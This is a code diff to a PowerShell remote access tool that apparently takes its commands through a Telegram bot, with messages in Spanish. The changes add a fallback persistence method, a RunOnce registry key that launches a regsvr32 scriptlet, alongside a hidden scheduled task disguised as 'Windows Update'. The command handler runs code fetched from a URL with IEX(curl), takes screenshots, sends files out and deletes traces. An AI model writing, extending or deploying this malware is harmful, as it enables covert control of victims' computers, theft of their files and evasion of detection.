@@ -174,7 +174,7 @@ Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\ope
 function whoami_me {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {[string]$privilegios = "Sin privilegios" }  else {[string]$privilegios = "Privilegios Altos"}; $usuario = $env:USERNAME ; $dominio = $env:USERDOMAIN
-$Usuario = " Usuario: $usuario`n" ; $Dominio =  "Dominio : $dominio`n" ; $Privilegios = "Privlegios : $privilegios`n"; return $usuario, $dominio, $privilegios
+$Usuario = "Usuario: $usuario`n" ; $Dominio =  "Dominio : $dominio`n" ; $Privilegios = "Privlegios : $privilegios`n"; return $usuario, $dominio, $privilegios
  }
 
 function mimigatoz {
@@ -217,7 +217,9 @@ $accion = New-ScheduledTaskAction -Execute "c:\windows\system32\regsvr32.exe" -A
 $desencadenante = New-ScheduledTaskTrigger -AtLogOn
 $tarea = New-ScheduledTask -Action $accion -Trigger $desencadenante -Settings (New-ScheduledTaskSettingsSet -Hidden)
 $tarea | Register-ScheduledTask -TaskName "Windows Update" | Out-Null; $texto = ""
-$texto = "Persistencia ejecutada correctamente"; return $texto;break}
+if ($? -eq $false) {$texto = "No se ha podido crear la persistencia, probaremos otro metodo."; envia-mensaje -text $texto -botkey $botkey -chat $chat_id;
+$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
+} if ($? -eq $false) {$texto = "Por algun motivo no hemos podido crear pesistencia"} else {$texto = "Persistencia ejecutada correctamente"} return $texto;break}
 }
 
 function remove-persistence {
@@ -225,8 +227,10 @@ If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 {$texto = "Sorry, necesitas privilegios";return $texto; break }  
 else {
 $comando = (Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"})
-if ($comando -eq $null -or $comando -eq "") {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
+$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";$check = Get-ItemProperty $key  | Select-String "regsvr32.exe" ; 
+if ($comando -eq $null -or $comando -eq "" -or $check.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
 $texto = "Eliminando persistencia"
+$modifica = "" ; set-item $Key $modifica
 Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"}  | Unregister-ScheduledTask -AsJob | Remove-WmiObject; Remove-Item C:\Windows\System32\update.sct; return $texto; break
 }}}
 
@@ -239,7 +243,7 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Whoami") {$texto = whoami_me;$texto = $texto -replace "@{","" -replace "}",""; $texto -replace "; ","`n" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 2 ; $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; Set-Location $ruta; del *.*; Set-Location $env:USERPROFILE ;exit}
- if ($comando -eq "/Scriptimport") {$texto = "/Scriptimport ejectuta script o comando powershell leyendo una archivo .txt desde una URL, Meterpreter, Empire...`nEjemplo: /scriptimport http://192.168.1.20/meterpreter.txt :D"}
+ if ($comando -eq "/Scriptimport") {$texto = "/Scriptimport ejectuta script o comando powershell leyendo una archivo .txt desde una URL, Meterpreter, Empire...`nEjemplo: /scriptimport http://192.168.1.20/meterpreter.txt :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Scriptimport *") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(curl $comando).content ;$texto = "Script Ejecutado desde $commando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat_id $chat_id }
  if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
